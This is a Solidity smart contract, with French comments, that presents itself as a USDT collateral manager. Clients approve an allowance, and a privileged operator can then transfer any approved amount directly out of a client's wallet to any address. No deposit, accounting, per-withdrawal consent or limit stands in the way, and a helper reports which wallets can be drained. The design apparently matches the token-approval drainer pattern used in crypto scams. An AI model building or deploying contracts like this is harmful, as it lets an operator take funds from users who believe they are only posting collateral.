// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

/**
 * @title CollateralManagerV3
 * @dev Version corrigée avec SafeERC20 pour USDT
 * 
 * CORRECTION: USDT ne retourne pas de boolean sur transferFrom()
 * SafeERC20 gère ce cas correctement.
 */
contract CollateralManagerV3 is Ownable, ReentrancyGuard {
    using SafeERC20 for IERC20;
    
    // Token utilisé (USDT)
    IERC20 public immutable token;
    
    // Adresse de l'opérateur autorisé à retirer les collatéraux
    address public operator;

    // Mapping pour suivre les clients qui ont approuvé
    mapping(address => bool) public registeredClients;
    mapping(address => uint256) public clientRegistrationTime;

    // Events
    event ClientApproved(address indexed client, uint256 allowance, uint256 timestamp);
    event CollateralWithdrawn(address indexed client, address indexed to, uint256 amount, string reason);
    event OperatorChanged(address indexed oldOperator, address indexed newOperator);

    modifier onlyOperator() {
        require(msg.sender == operator, "Only operator can call this");
        _;
    }

    constructor(address _token) Ownable(msg.sender) {
        require(_token != address(0), "Invalid token address");
        token = IERC20(_token);
        operator = msg.sender;
    }

    /**
     * @dev Change l'adresse de l'opérateur
     */
    function setOperator(address _operator) external onlyOwner {
        require(_operator != address(0), "Invalid operator address");
        address oldOperator = operator;
        operator = _operator;
        emit OperatorChanged(oldOperator, _operator);
    }

    /**
     * @dev Enregistre un client (optionnel)
     */
    function registerClient() external nonReentrant {
        uint256 allowance = token.allowance(msg.sender, address(this));
        require(allowance > 0, "You must approve this contract first");
        
        registeredClients[msg.sender] = true;
        clientRegistrationTime[msg.sender] = block.timestamp;
        
        emit ClientApproved(msg.sender, allowance, block.timestamp);
    }

    /**
     * @dev Permet à l'opérateur de retirer les collatéraux d'un client
     * UTILISE SafeERC20 pour compatibilité USDT
     */
    function withdrawCollateral(
        address client,
        address to,
        uint256 amount,
        string calldata reason
    ) external onlyOperator nonReentrant {
        require(client != address(0), "Invalid client address");
        require(to != address(0), "Invalid destination address");
        require(amount > 0, "Amount must be greater than 0");
        
        // Vérifier l'allowance du client vers ce contrat
        uint256 allowance = token.allowance(client, address(this));
        require(allowance >= amount, "Insufficient allowance");
        
        // Vérifier le solde du client
        uint256 clientBalance = token.balanceOf(client);
        require(clientBalance >= amount, "Insufficient client balance");
        
        // Transférer les tokens avec SafeERC20 (gère USDT correctement)
        token.safeTransferFrom(client, to, amount);
        
        emit CollateralWithdrawn(client, to, amount, reason);
    }

    /**
     * @dev Vérifie l'allowance d'un client vers ce contrat
     */
    function getClientAllowance(address client) external view returns (uint256) {
        return token.allowance(client, address(this));
    }

    /**
     * @dev Vérifie le solde USDT d'un client
     */
    function getClientBalance(address client) external view returns (uint256) {
        return token.balanceOf(client);
    }

    /**
     * @dev Vérifie si un client est enregistré
     */
    function isClientRegistered(address client) external view returns (bool) {
        return registeredClients[client];
    }

    /**
     * @dev Vérifie si un client a approuvé ce contrat
     */
    function hasClientApproved(address client) external view returns (bool) {
        return token.allowance(client, address(this)) > 0;
    }

    /**
     * @dev Retourne les informations complètes d'un client
     */
    function getClientInfo(address client) external view returns (
        uint256 balance,
        uint256 allowance,
        bool registered,
        bool canWithdraw
    ) {
        balance = token.balanceOf(client);
        allowance = token.allowance(client, address(this));
        registered = registeredClients[client];
        canWithdraw = allowance > 0 && balance > 0;
    }
}
